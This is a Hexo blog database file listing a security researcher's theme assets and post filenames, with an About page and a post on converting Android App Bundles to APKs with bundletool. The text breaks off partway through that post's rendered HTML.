{"meta":{"version":1,"warehouse":"4.0.0"},"models":{"Asset":[{"_id":"themes/clean-blog/source/css/article.styl","path":"css/article.styl","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/css/base.styl","path":"css/base.styl","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/css/mixins.styl","path":"css/mixins.styl","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/css/style.styl","path":"css/style.styl","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/css/variables.styl","path":"css/variables.styl","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/img/about-bg.jpg","path":"img/about-bg.jpg","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/img/contact-bg.jpg","path":"img/contact-bg.jpg","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/img/favicon.ico","path":"img/favicon.ico","modified":1,"renderable":1},{"_id":"themes/clean-blog/source/img/home-bg.jpg","path":"img/home-bg.jpg","modified":1,"renderable":1}],"Cache":[{"_id":"themes/clean-blog/LICENSE","hash":"8726b416df4f067cff579e859f05c4b594b8be09","modified":1681976488348},{"_id":"themes/clean-blog/README.md","hash":"3663228602b0a5f8941e49e7851698ea13a07eb3","modified":1681976488348},{"_id":"themes/clean-blog/_config.yml","hash":"319f3f33436f746cdace5c414a126c97c15d5e82","modified":1681976488348},{"_id":"themes/clean-blog/languages/de.yml","hash":"424a9c1e6ab69334d7873f6574da02ca960aa572","modified":1681976488349},{"_id":"themes/clean-blog/languages/default.yml","hash":"97326c9e6518d9f379778178b3b8f9a58434725d","modified":1681976488349},{"_id":"themes/clean-blog/languages/en.yml","hash":"97326c9e6518d9f379778178b3b8f9a58434725d","modified":1681976488349},{"_id":"themes/clean-blog/languages/es.yml","hash":"cb4eeca0ed3768a77e0cd216300f2b2549628b1b","modified":1681976488349},{"_id":"themes/clean-blog/languages/fr.yml","hash":"e9e6f7cb362ebb7997f11027498a2748fe3bac95","modified":1681976488350},{"_id":"themes/clean-blog/languages/ko.yml","hash":"40b97194caa097cbc037a79c86530be132743920","modified":1681976488350},{"_id":"themes/clean-blog/languages/no.yml","hash":"8ca475a3b4f8efe6603030f0013aae39668230e1","modified":1681976488350},{"_id":"themes/clean-blog/languages/pl.yml","hash":"de7eb5850ae65ba7638e907c805fea90617a988c","modified":1681976488350},{"_id":"themes/clean-blog/languages/pt.yml","hash":"1d0c3689eb32fe13f37f8f6f303af7624ebfbaf0","modified":1681976488351},{"_id":"themes/clean-blog/languages/ru.yml","hash":"42df7afeb7a35dc46d272b7f4fb880a9d9ebcaa5","modified":1681976488351},{"_id":"themes/clean-blog/languages/zh-CN.yml","hash":"7bfcb0b8e97d7e5edcfca8ab26d55d9da2573c1c","modified":1681976488352},{"_id":"themes/clean-blog/languages/zh-TW.yml","hash":"9acac6cc4f8002c3fa53ff69fb8cf66c915bd016","modified":1681976488352},{"_id":"themes/clean-blog/layout/archive.ejs","hash":"3492fc8ec76f49eb05fa4c0d48db46b76f04805c","modified":1681976488356},{"_id":"themes/clean-blog/layout/index.ejs","hash":"41b0fec1a9049518040dc6fb4857659485ed5136","modified":1681976488356},{"_id":"themes/clean-blog/layout/layout.ejs","hash":"da2f9018047924ddaf376aee5996c7ddc06cebc1","modified":1681976488356},{"_id":"themes/clean-blog/layout/page.ejs","hash":"9e6c5704b26a6732a42f01bd09635b3b81909403","modified":1681976488357},{"_id":"themes/clean-blog/layout/post.ejs","hash":"38382e9bbeb6b8d2eafbd53fff2984111f524c1a","modified":1681976488357},{"_id":"themes/clean-blog/layout/_partial/after-footer.ejs","hash":"80970a6cfbf9b1abe0c472636b321a9be08fdc43","modified":1681976488352},{"_id":"themes/clean-blog/layout/_partial/article-archive.ejs","hash":"3d8d98c6545b8332a6d6ed4f8b00327df03ea945","modified":1681976488353},{"_id":"themes/clean-blog/layout/_partial/article-categories.ejs","hash":"5a0bf5a20f670621d8013c9b9d7976b45c8aa80f","modified":1681976488353},{"_id":"themes/clean-blog/layout/_partial/article-full.ejs","hash":"f78ff5eedf9045148ee255d5387a05a7000a7a47","modified":1681976488353},{"_id":"themes/clean-blog/layout/_partial/article-index.ejs","hash":"e433df4e245e2d4c628052c6e59966563542d94d","modified":1681976488353},{"_id":"themes/clean-blog/layout/_partial/article-tags.ejs","hash":"6136434be09056c1466149cecb3cc2e80d107999","modified":1681976488354},{"_id":"themes/clean-blog/layout/_partial/comments.ejs","hash":"3fedb75436439d1d6979b7e4d20d48a593e12be4","modified":1681976488354},{"_id":"themes/clean-blog/layout/_partial/footer.ejs","hash":"d252fb1a41890e6481bb054f9cc4ceec3c0b0ed9","modified":1681976488354},{"_id":"themes/clean-blog/layout/_partial/gallery.ejs","hash":"21e4f28909f4a79ff7d9f10bdfef6a8cb11632bf","modified":1681976488354},{"_id":"themes/clean-blog/layout/_partial/google-analytics.ejs","hash":"4e6e8de9becea5a1636a4dcadcf7a10c06e2426e","modified":1681976488354},{"_id":"themes/clean-blog/layout/_partial/head.ejs","hash":"3ccfc84e3ed67415fe71a1767d5e77a6b1f84a7a","modified":1681976488355},{"_id":"themes/clean-blog/layout/_partial/menu.ejs","hash":"ba299316400499e9ede154e9627cafb7ce411888","modified":1681976488355},{"_id":"themes/clean-blog/layout/_partial/pagination.ejs","hash":"557d6bb069a1d48af49ae912994653f44b32a570","modified":1681976488355},{"_id":"themes/clean-blog/layout/_partial/tag-category-index.ejs","hash":"10cdc1b7866999c714a666557c150d2c79c1fba9","modified":1681976488355},{"_id":"themes/clean-blog/source/css/article.styl","hash":"f5294d7a3d6127fcb287de3ff0c12aebb1766c7b","modified":1681976488360},{"_id":"themes/clean-blog/source/css/base.styl","hash":"0b54825903d08b5f7f7fe95ef4261c90e980abdb","modified":1681976488361},{"_id":"themes/clean-blog/source/css/mixins.styl","hash":"892f55e8a71f2e23a52e48e217dad3303bbad913","modified":1681976488361},{"_id":"themes/clean-blog/source/css/style.styl","hash":"c40dc495a41007d21c59f342ee42b2d31d7b5ff4","modified":1681976488361},{"_id":"themes/clean-blog/source/css/variables.styl","hash":"cd82df5ca8dfbcfec12d833f01adfac00878e835","modified":1681976488362},{"_id":"themes/clean-blog/source/img/about-bg.jpg","hash":"d39126a6456f2bac0169d1779304725f179c9900","modified":1681976488362},{"_id":"themes/clean-blog/source/img/favicon.ico","hash":"7fef515c1a9b96bf38b48cd9864b4e8cf51326d5","modified":1681976488364},{"_id":"source/.DS_Store","hash":"20a7489720b0a122cb7f4cd8079443d1db805f0c","modified":1681976488337},{"_id":"source/_posts/Android-APP-Bundle.md","hash":"3085a7639c75985321feab638a469211637493ab","modified":1681976488340},{"_id":"source/_posts/CPython-zipfile-Code-Tracing.md","hash":"56ed45937c8372719d950f562ce760ccb3cdf68f","modified":1681976488340},{"_id":"source/_posts/Cheat-sheet-for-poetry.md","hash":"63f1ad99b3acdd95eb5cd4e43efdf9a7a302fcc2","modified":1681976488341},{"_id":"source/_posts/Debian-Packaging.md","hash":"f31608584ceff9ab1032a21fa02f69cf3616f34e","modified":1681976488341},{"_id":"source/_posts/Frida-tips.md","hash":"39696302addde6c0fe243e4ac20278e23bec848c","modified":1681976488341},{"_id":"source/_posts/GIL.md","hash":"fc4cb4c92ee1972948c335ba6edef6261a14b5c9","modified":1681976488341},{"_id":"source/_posts/Github-Bot.md","hash":"b13a60047bc466072a417f6ef8d3730b0fb9acc0","modified":1681976488342},{"_id":"source/_posts/How-to-draft-a-new-release-on-PyPi-with-Github-Action.md","hash":"87c0c8680699e40744ce69aea6975a9fc19cddda","modified":1681976488342},{"_id":"source/_posts/Mining-malware-analysis.md","hash":"4458f197bcbea29c30d3477475df18f7835e0766","modified":1681976488343},{"_id":"source/_posts/PyCharm-Debug.md","hash":"1ceab2dd4898528ec22e4db6233dd7816fcb1249","modified":1681976488344},{"_id":"source/_posts/Roaming-Mantis-with-Quark-Engine.md","hash":"96200990d35a4293bad8b83ccf669108c958ff58","modified":1681976488344},{"_id":"source/_posts/Using-SSH-to-connect-with-Github.md","hash":"1b28b468bd272da92b1db00b4503ed41f42bf3a8","modified":1681976488344},{"_id":"source/_posts/androguard-code-tracing.md","hash":"bbefe0f430b180de34de68ba9dc56616baa48153","modified":1681976488345},{"_id":"source/_posts/pipenv.md","hash":"e785eb63cc2b74876d29649c74a48f14f278ea8d","modified":1681976488346},{"_id":"source/about/.DS_Store","hash":"45673a8ec47535550c1655fb6f129816c4bf94f9","modified":1681976488346},{"_id":"source/about/index.md","hash":"4b59c7b0e1589bf170ff07b2e4bbe2b89735906c","modified":1681976488346},{"_id":"source/categories/index.md","hash":"ab2f921108fcd1db32f6d2715f504166673b0de6","modified":1681976488347},{"_id":"source/tags/index.md","hash":"8cc0290b13006853ed67ba3dcaf82a7d1e1b1601","modified":1681976488347},{"_id":"source/_posts/.idea/_posts.iml","hash":"f223b4ce8a5c906ec7d06d73d942c033b0b45271","modified":1681976488337},{"_id":"source/_posts/.idea/misc.xml","hash":"c4670bd34d32755c8a349b3b32400b5dc3ee2e87","modified":1681976488338},{"_id":"source/_posts/.idea/modules.xml","hash":"6abd6dcb985048745c9214d67295bdf1597307ee","modified":1681976488338},{"_id":"source/_posts/.idea/workspace.xml","hash":"3b9f444ac1a363ed4e3eea8aace853e5db51f6de","modified":1681976488339},{"_id":"source/_posts/.idea/inspectionProfiles/profiles_settings.xml","hash":"123097fe0d1ca811d1a355725d7066386ed490ec","modified":1681976488338},{"_id":"themes/clean-blog/source/img/contact-bg.jpg","hash":"6af63305c923899017e727b5ca968a2703bc08cf","modified":1681976488363},{"_id":"themes/clean-blog/source/img/home-bg.jpg","hash":"e9d4b27b05393ffd97e00033e5769c048e9811ef","modified":1681976488369},{"_id":"public/atom.xml","hash":"01b082d4e767e58ea1022bf4cd757a6ffa8aa2e5","modified":1681976546454},{"_id":"public/content.json","hash":"db5099044112844ed1440de649f3f1ecab96b41b","modified":1681976546454},{"_id":"public/sitemap.xml","hash":"f9256ca3647bcb3bbbe4789cc39a144559f864a8","modified":1681976546454},{"_id":"public/about/index.html","hash":"1014092f1bf0f2fe750fd50ca2863422d5f599a1","modified":1681976546454},{"_id":"public/categories/index.html","hash":"c9e2dc539f9a039aab9c3025427f9e1701e509ee","modified":1681976546454},{"_id":"public/tags/index.html","hash":"dc895eb89987bba9bd6fc3ccf38409624ef1a283","modified":1681976546454},{"_id":"public/2022/06/05/Using-SSH-to-connect-with-Github/index.html","hash":"745aa10d82dddce2cd6046a2cdf9acc6008004aa","modified":1681976546454},{"_id":"public/2022/05/04/Cheat-sheet-for-poetry/index.html","hash":"aa01646cd4662cb48b1a5be1166440087996458d","modified":1681976546454},{"_id":"public/2022/04/22/PyCharm-Debug/index.html","hash":"191441a8bff3b76811ee3fb753c2f99325be93d8","modified":1681976546454},{"_id":"public/2022/04/22/Frida-tips/index.html","hash":"cd9a6940d45df4458adc13b81759d0489adc2fb5","modified":1681976546454},{"_id":"public/2022/04/22/Github-Bot/index.html","hash":"6535135bb8c72ccb411d6fbd127709e80c64cc8e","modified":1681976546454},{"_id":"public/2021/10/12/Android-APP-Bundle/index.html","hash":"a58eeb2355fb462a5c06df4ade6f0f2b8716eebe","modified":1681976546454},{"_id":"public/2021/10/07/How-to-draft-a-new-release-on-PyPi-with-Github-Action/index.html","hash":"d04dbf493a95b486da31d6fa04f0d53840ee75a6","modified":1681976546454},{"_id":"public/2020/09/24/pipenv/index.html","hash":"b3a28c7e9c2807053e8fc94eab9c0cfc2113f37a","modified":1681976546454},{"_id":"public/archives/index.html","hash":"d8a8176a1d2aa7eb9afa19565f13261b658cc218","modified":1681976546454},{"_id":"public/archives/page/2/index.html","hash":"7023ff4540d3cf66565620eb231f13a6e5a40a4c","modified":1681976546454},{"_id":"public/archives/2020/index.html","hash":"a5bfb66816254abda96390cecc333d64cf16ee00","modified":1681976546454},{"_id":"public/archives/2020/09/index.html","hash":"7b300042d79f83a5a61b524c544180b6928930c0","modified":1681976546454},{"_id":"public/archives/2021/index.html","hash":"b9563299349d699d4e48042ac63a378c873ed8fa","modified":1681976546454},{"_id":"public/archives/2021/05/index.html","hash":"0600732542c848a8ced878ed7509d99631e26b3c","modified":1681976546454},{"_id":"public/archives/2021/09/index.html","hash":"6a0f43c806d0714b6d9d302c1012eff569292367","modified":1681976546454},{"_id":"public/archives/2021/10/index.html","hash":"a8ce860f1ce7139e7aa1c9dca09ae41e56ce06c1","modified":1681976546454},{"_id":"public/archives/2021/11/index.html","hash":"3829713c28213db22d47cf536b4af32d9ee12c83","modified":1681976546454},{"_id":"public/archives/2022/index.html","hash":"72b807ef4686777aec83be3878bcd5ef98beac91","modified":1681976546454},{"_id":"public/archives/2022/04/index.html","hash":"d5a075421eb79cbe03b2ba91eeb51cdeb1dd9f61","modified":1681976546454},{"_id":"public/archives/2022/05/index.html","hash":"8be4d074c241331197382783fa3e5c0cfc8b1a47","modified":1681976546454},{"_id":"public/archives/2022/06/index.html","hash":"9fb2cd9c790608998e9e67c0a3b4697a27b3e19f","modified":1681976546454},{"_id":"public/index.html","hash":"fe829039d3c3035b20e35fea0b40483438542104","modified":1681976546454},{"_id":"public/page/2/index.html","hash":"0ab67a5dc9e1e91a9141aa651883c996cb615946","modified":1681976546454},{"_id":"public/tags/Android/index.html","hash":"fcc35f93f772854d95cfd9a5c6054b9d50ce3abe","modified":1681976546454},{"_id":"public/tags/vulnerability/index.html","hash":"1139c9e0e7895526b6d624bb6df76a2dc396d3ee","modified":1681976546454},{"_id":"public/tags/python/index.html","hash":"b57b0b7950ec65d04b664735df6fb39267dd2569","modified":1681976546454},{"_id":"public/tags/Debian/index.html","hash":"09e492e1c7f3a462c90205f12e378a3d41c84b87","modified":1681976546454},{"_id":"public/tags/Linux/index.html","hash":"db6a443e755bfc04b1244258dec3c8fa0747524a","modified":1681976546454},{"_id":"public/tags/Kali-Linux/index.html","hash":"6d98102602582cac4aaa0da4d6c3f94b544a03ba","modified":1681976546454},{"_id":"public/tags/github/index.html","hash":"c3e72f8766b1014ec99857e3a2b0385ca48b8dbd","modified":1681976546454},{"_id":"public/tags/pypi/index.html","hash":"a8e4aefa59756cf0f7303c266f32796c8fea9ea5","modified":1681976546454},{"_id":"public/tags/Malware/index.html","hash":"ce4cfc455aebd3b14b053da61a6f77336e8af113","modified":1681976546454},{"_id":"public/tags/git/index.html","hash":"61b3beb24208408158b52a9ead6d7e883d7c8720","modified":1681976546454},{"_id":"public/2022/04/22/Mining-malware-analysis/index.html","hash":"2ec4e04ead2b663f95d880aaffd1d8c112a8b3ad","modified":1681976546454},{"_id":"public/2022/04/22/androguard-code-tracing/index.html","hash":"0ebf4c7128942ee30904a78fc2ee3e7479ce0bb7","modified":1681976546454},{"_id":"public/2021/11/24/GIL/index.html","hash":"480b868f2f547c4bfca2f36958b417f80a0df773","modified":1681976546454},{"_id":"public/2021/09/30/Roaming-Mantis-with-Quark-Engine/index.html","hash":"fbf771f5c49fcb3d817b35db19543ad32f8641a0","modified":1681976546454},{"_id":"public/2021/09/30/CPython-zipfile-Code-Tracing/index.html","hash":"360b4a8432f1e618fc2762c2e131630743fd3e11","modified":1681976546454},{"_id":"public/2021/05/03/Debian-Packaging/index.html","hash":"1261c3877381ac7991df5df5589d40e392329e5c","modified":1681976546454},{"_id":"public/img/about-bg.jpg","hash":"d39126a6456f2bac0169d1779304725f179c9900","modified":1681976546454},{"_id":"public/img/favicon.ico","hash":"7fef515c1a9b96bf38b48cd9864b4e8cf51326d5","modified":1681976546454},{"_id":"public/css/article.css","hash":"f0ee490e1207191946fffc9444f891e9b7ae7289","modified":1681976546454},{"_id":"public/css/base.css","hash":"91b6c032be9e146dfd68880fe79f77f5d2771b0f","modified":1681976546454},{"_id":"public/css/mixins.css","hash":"45146e7f4346351cd7f364de344aecf9574475f9","modified":1681976546454},{"_id":"public/css/style.css","hash":"029be79fde48199c77c76dbaac80cec3715f0bc8","modified":1681976546454},{"_id":"public/css/variables.css","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1681976546454},{"_id":"public/img/contact-bg.jpg","hash":"6af63305c923899017e727b5ca968a2703bc08cf","modified":1681976546454},{"_id":"public/img/home-bg.jpg","hash":"e9d4b27b05393ffd97e00033e5769c048e9811ef","modified":1681976546454}],"Category":[],"Data":[],"Page":[{"title":"About","description":"Hi there 👋","layout":"about","comments":0,"sidebar":"custom","_content":"\n### Hi there 👋\n\n#### Who am I\n\nJunWei is a malware researcher at Recorded Future Triage Sandbox. With a passion for malware analysis, reverse engineering, and threat intelligence. Also, I’ve been very involved in open-source projects, used to be the lead developer of Quark-Engine, mentor of the GSoC Honeynet project, and package maintainer of Kali Linux.\n\nAlso, as a volunteer for the PyCon APAC/TW Program Chair, I helped organize the PyCon Taiwan conference. I also gave talks at security conferences like Black Hat, DEFCON, HITB, and ROOTCON.\n\n#### Open Source Community\n\n- [Quark-Engine](https://github.com/quark-engine/quark-engine) - Creator\n- [sunzip](https://github.com/twbgc/sunzip) - Creator\n- [Androguard](https://github.com/androguard/androguard) - Contributor & PyPi Maintainer\n- [Kali Linux](http://pkg.kali.org/pkg/quark-engine) - Quark-Engine package maintainer\n- [Google Summer of Code](https://www.honeynet.org/gsoc/gsoc-2021/google-summer-of-code-2021-project-ideas/#quark) - Mentor under Honeynet project\n\n#### Talks\n\n- 🌱 [My Previous Talks](https://github.com/krnick/talks)\n\n![JunWei Song's Github stats](https://github-readme-stats.vercel.app/api?username=krnick&theme=blue-green&show_icons=true)\n\n","source":"about/index.md","raw":"---\ntitle: About\ndescription: Hi there 👋\nlayout: about\ncomments: false\nsidebar: custom\n---\n\n### Hi there 👋\n\n#### Who am I\n\nJunWei is a malware researcher at Recorded Future Triage Sandbox. With a passion for malware analysis, reverse engineering, and threat intelligence. Also, I’ve been very involved in open-source projects, used to be the lead developer of Quark-Engine, mentor of the GSoC Honeynet project, and package maintainer of Kali Linux.\n\nAlso, as a volunteer for the PyCon APAC/TW Program Chair, I helped organize the PyCon Taiwan conference. I also gave talks at security conferences like Black Hat, DEFCON, HITB, and ROOTCON.\n\n#### Open Source Community\n\n- [Quark-Engine](https://github.com/quark-engine/quark-engine) - Creator\n- [sunzip](https://github.com/twbgc/sunzip) - Creator\n- [Androguard](https://github.com/androguard/androguard) - Contributor & PyPi Maintainer\n- [Kali Linux](http://pkg.kali.org/pkg/quark-engine) - Quark-Engine package maintainer\n- [Google Summer of Code](https://www.honeynet.org/gsoc/gsoc-2021/google-summer-of-code-2021-project-ideas/#quark) - Mentor under Honeynet project\n\n#### Talks\n\n- 🌱 [My Previous Talks](https://github.com/krnick/talks)\n\n![JunWei Song's Github stats](https://github-readme-stats.vercel.app/api?username=krnick&theme=blue-green&show_icons=true)\n\n","date":"2023-04-20T07:41:28.346Z","updated":"2023-04-20T07:41:28.346Z","path":"about/index.html","_id":"clgotepm70000i7ri2vz4eohu","content":"<h3 id=\"Hi-there-👋\"><a href=\"#Hi-there-👋\" class=\"headerlink\" title=\"Hi there 👋\"></a>Hi there 👋</h3><h4 id=\"Who-am-I\"><a href=\"#Who-am-I\" class=\"headerlink\" title=\"Who am I\"></a>Who am I</h4><p>JunWei is a malware researcher at Recorded Future Triage Sandbox. With a passion for malware analysis, reverse engineering, and threat intelligence. Also, I’ve been very involved in open-source projects, used to be the lead developer of Quark-Engine, mentor of the GSoC Honeynet project, and package maintainer of Kali Linux.</p>\n<p>Also, as a volunteer for the PyCon APAC&#x2F;TW Program Chair, I helped organize the PyCon Taiwan conference. I also gave talks at security conferences like Black Hat, DEFCON, HITB, and ROOTCON.</p>\n<h4 id=\"Open-Source-Community\"><a href=\"#Open-Source-Community\" class=\"headerlink\" title=\"Open Source Community\"></a>Open Source Community</h4><ul>\n<li><a href=\"https://github.com/quark-engine/quark-engine\">Quark-Engine</a> - Creator</li>\n<li><a href=\"https://github.com/twbgc/sunzip\">sunzip</a> - Creator</li>\n<li><a href=\"https://github.com/androguard/androguard\">Androguard</a> - Contributor &amp; PyPi Maintainer</li>\n<li><a href=\"http://pkg.kali.org/pkg/quark-engine\">Kali Linux</a> - Quark-Engine package maintainer</li>\n<li><a href=\"https://www.honeynet.org/gsoc/gsoc-2021/google-summer-of-code-2021-project-ideas/#quark\">Google Summer of Code</a> - Mentor under Honeynet project</li>\n</ul>\n<h4 id=\"Talks\"><a href=\"#Talks\" class=\"headerlink\" title=\"Talks\"></a>Talks</h4><ul>\n<li>🌱 <a href=\"https://github.com/krnick/talks\">My Previous Talks</a></li>\n</ul>\n<p><img src=\"https://github-readme-stats.vercel.app/api?username=krnick&theme=blue-green&show_icons=true\" alt=\"JunWei Song&#39;s Github stats\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Hi-there-👋\"><a href=\"#Hi-there-👋\" class=\"headerlink\" title=\"Hi there 👋\"></a>Hi there 👋</h3><h4 id=\"Who-am-I\"><a href=\"#Who-am-I\" class=\"headerlink\" title=\"Who am I\"></a>Who am I</h4><p>JunWei is a malware researcher at Recorded Future Triage Sandbox. With a passion for malware analysis, reverse engineering, and threat intelligence. Also, I’ve been very involved in open-source projects, used to be the lead developer of Quark-Engine, mentor of the GSoC Honeynet project, and package maintainer of Kali Linux.</p>\n<p>Also, as a volunteer for the PyCon APAC&#x2F;TW Program Chair, I helped organize the PyCon Taiwan conference. I also gave talks at security conferences like Black Hat, DEFCON, HITB, and ROOTCON.</p>\n<h4 id=\"Open-Source-Community\"><a href=\"#Open-Source-Community\" class=\"headerlink\" title=\"Open Source Community\"></a>Open Source Community</h4><ul>\n<li><a href=\"https://github.com/quark-engine/quark-engine\">Quark-Engine</a> - Creator</li>\n<li><a href=\"https://github.com/twbgc/sunzip\">sunzip</a> - Creator</li>\n<li><a href=\"https://github.com/androguard/androguard\">Androguard</a> - Contributor &amp; PyPi Maintainer</li>\n<li><a href=\"http://pkg.kali.org/pkg/quark-engine\">Kali Linux</a> - Quark-Engine package maintainer</li>\n<li><a href=\"https://www.honeynet.org/gsoc/gsoc-2021/google-summer-of-code-2021-project-ideas/#quark\">Google Summer of Code</a> - Mentor under Honeynet project</li>\n</ul>\n<h4 id=\"Talks\"><a href=\"#Talks\" class=\"headerlink\" title=\"Talks\"></a>Talks</h4><ul>\n<li>🌱 <a href=\"https://github.com/krnick/talks\">My Previous Talks</a></li>\n</ul>\n<p><img src=\"https://github-readme-stats.vercel.app/api?username=krnick&theme=blue-green&show_icons=true\" alt=\"JunWei Song&#39;s Github stats\"></p>\n"},{"title":"Categories","layout":"categories","date":"2020-09-23T05:06:09.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: Categories\nlayout: categories\ndate: 2020-09-23 13:06:09\ntype: \"categories\"\ncomments: false\n---\n","updated":"2023-04-20T07:41:28.347Z","path":"categories/index.html","_id":"clgotepmj0002i7rictvshspg","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","date":"2020-09-23T05:06:01.000Z","layout":"tags","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\ndate: 2020-09-23 13:06:01\nlayout: tags\ntype: \"tags\"\ncomments: false\n---\n","updated":"2023-04-20T07:41:28.347Z","path":"tags/index.html","_id":"clgotepmo0005i7ri565b9opp","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Android APP Bundle","date":"2021-10-12T07:22:48.000Z","_content":"# Android App Bundle(aka aab)\n\nGoogle has announced that all applications that need to upload to Google Play have to use the format called \"aab\", which means `Android App Bundle`.\n\nThe reason why Google using the aab format can be organized with two things:\n1.  It helps reduce the size of downloaded files.\n2. It can generate APKs dynamically for various device configurations such as different CPUs, screen size, language, etc.\n\nHowever, from the view of the malware analysts, it should not be a problem because the aab format only employs when publishing and users' devices still get the APK source file generated by `bundletool` from Google Play.\n\nHere is the step by step to analyze the aab format application\n\n## How to build an \"aab\" file when you complete your project by yourself\n\nOpen Android Studio -> Build -> Build Bundle(s) / APK(s) -> Build Bundle(s)\n\n![](https://i.imgur.com/3PXo5Ox.png)\n\nThe aab file will locate in:\n\n`/Users/$USER/AndroidStudioProjects/Test/app/build/outputs/bundle/debug/app-debug.aab`\n\nIt is literally another kind of compressed file, and its directory after unzipping is as shown below.\n\n![](https://i.imgur.com/B7PGHfm.png)\n\nYou may probably know, the crucial file `DEX` locate in the dex directory.\n\n\n## Convert .aab to .apk file\n\nUsing the command-line tool bundletool, you can convert aab files into APK files with just one command.\n\n```bash=\nbundletool build-apks --bundle=app-debug.aab --output=my_app.apks\n```\n\nYou may notice that the output of the APK is suffixed with \"s\", which means it is a bunch of APK files in an archive.\n\n![](https://i.imgur.com/YyqAX1r.png)\n\nAll of these APKs are generated based on a different language, screen size, etc. Now you can pick any of them to analyze as usual.\n\nReference:\nhttps://developer.android.com/studio/command-line/bundletool\n","source":"_posts/Android-APP-Bundle.md","raw":"---\ntitle: Android APP Bundle\ndate: 2021-10-12 15:22:48\ntags:\n- Android\n---\n# Android App Bundle(aka aab)\n\nGoogle has announced that all applications that need to upload to Google Play have to use the format called \"aab\", which means `Android App Bundle`.\n\nThe reason why Google using the aab format can be organized with two things:\n1.  It helps reduce the size of downloaded files.\n2. It can generate APKs dynamically for various device configurations such as different CPUs, screen size, language, etc.\n\nHowever, from the view of the malware analysts, it should not be a problem because the aab format only employs when publishing and users' devices still get the APK source file generated by `bundletool` from Google Play.\n\nHere is the step by step to analyze the aab format application\n\n## How to build an \"aab\" file when you complete your project by yourself\n\nOpen Android Studio -> Build -> Build Bundle(s) / APK(s) -> Build Bundle(s)\n\n![](https://i.imgur.com/3PXo5Ox.png)\n\nThe aab file will locate in:\n\n`/Users/$USER/AndroidStudioProjects/Test/app/build/outputs/bundle/debug/app-debug.aab`\n\nIt is literally another kind of compressed file, and its directory after unzipping is as shown below.\n\n![](https://i.imgur.com/B7PGHfm.png)\n\nYou may probably know, the crucial file `DEX` locate in the dex directory.\n\n\n## Convert .aab to .apk file\n\nUsing the command-line tool bundletool, you can convert aab files into APK files with just one command.\n\n```bash=\nbundletool build-apks --bundle=app-debug.aab --output=my_app.apks\n```\n\nYou may notice that the output of the APK is suffixed with \"s\", which means it is a bunch of APK files in an archive.\n\n![](https://i.imgur.com/YyqAX1r.png)\n\nAll of these APKs are generated based on a different language, screen size, etc. Now you can pick any of them to analyze as usual.\n\nReference:\nhttps://developer.android.com/studio/command-line/bundletool\n","slug":"Android-APP-Bundle","published":1,"updated":"2023-04-20T07:41:28.340Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmd0001i7rih6626v0v","content":"<h1 id=\"Android-App-Bundle-aka-aab\"><a href=\"#Android-App-Bundle-aka-aab\" class=\"headerlink\" title=\"Android App Bundle(aka aab)\"></a>Android App Bundle(aka aab)</h1><p>Google has announced that all applications that need to upload to Google Play have to use the format called “aab”, which means <code>Android App Bundle</code>.</p>\n<p>The reason why Google using the aab format can be organized with two things:</p>\n<ol>\n<li>It helps reduce the size of downloaded files.</li>\n<li>It can generate APKs dynamically for various device configurations such as different CPUs, screen size, language, etc.</li>\n</ol>\n<p>However, from the view of the malware analysts, it should not be a problem because the aab format only employs when publishing and users’ devices still get the APK source file generated by <code>bundletool</code> from Google Play.</p>\n<p>Here is the step by step to analyze the aab format application</p>\n<h2 id=\"How-to-build-an-“aab”-file-when-you-complete-your-project-by-yourself\"><a href=\"#How-to-build-an-“aab”-file-when-you-complete-your-project-by-yourself\" class=\"headerlink\" title=\"How to build an “aab” file when you complete your project by yourself\"></a>How to build an “aab” file when you complete your project by yourself</h2><p>Open Android Studio -&gt; Build -&gt; Build Bundle(s) &#x2F; APK(s) -&gt; Build Bundle(s)</p>\n<p><img src=\"https://i.imgur.com/3PXo5Ox.png\"></p>\n<p>The aab file will locate in:</p>\n<p><code>/Users/$USER/AndroidStudioProjects/Test/app/build/outputs/bundle/debug/app-debug.aab</code></p>\n<p>It is literally another kind of compressed file, and its directory after unzipping is as shown below.</p>\n<p><img src=\"https://i.imgur.com/B7PGHfm.png\"></p>\n<p>You may probably know, the crucial file <code>DEX</code> locate in the dex directory.</p>\n<h2 id=\"Convert-aab-to-apk-file\"><a href=\"#Convert-aab-to-apk-file\" class=\"headerlink\" title=\"Convert .aab to .apk file\"></a>Convert .aab to .apk file</h2><p>Using the command-line tool bundletool, you can convert aab files into APK files with just one command.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundletool build-apks --bundle=app-debug.aab --output=my_app.apks</span><br></pre></td></tr></table></figure>\n\n<p>You may notice that the output of the APK is suffixed with “s”, which means it is a bunch of APK files in an archive.</p>\n<p><img src=\"https://i.imgur.com/YyqAX1r.png\"></p>\n<p>All of these APKs are generated based on a different language, screen size, etc. Now you can pick any of them to analyze as usual.</p>\n<p>Reference:<br><a href=\"https://developer.android.com/studio/command-line/bundletool\">https://developer.android.com/studio/command-line/bundletool</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Android-App-Bundle-aka-aab\"><a href=\"#Android-App-Bundle-aka-aab\" class=\"headerlink\" title=\"Android App Bundle(aka aab)\"></a>Android App Bundle(aka aab)</h1><p>Google has announced that all applications that need to upload to Google Play have to use the format called “aab”, which means <code>Android App Bundle</code>.</p>\n<p>The reason why Google using the aab format can be organized with two things:</p>\n<ol>\n<li>It helps reduce the size of downloaded files.</li>\n<li>It can generate APKs dynamically for various device configurations such as different CPUs, screen size, language, etc.</li>\n</ol>\n<p>However, from the view of the malware analysts, it should not be a problem because the aab format only employs when publishing and users’ devices still get the APK source file generated by <code>bundletool</code> from Google Play.</p>\n<p>Here is the step by step to analyze the aab format application</p>\n<h2 id=\"How-to-build-an-“aab”-file-when-you-complete-your-project-by-yourself\"><a 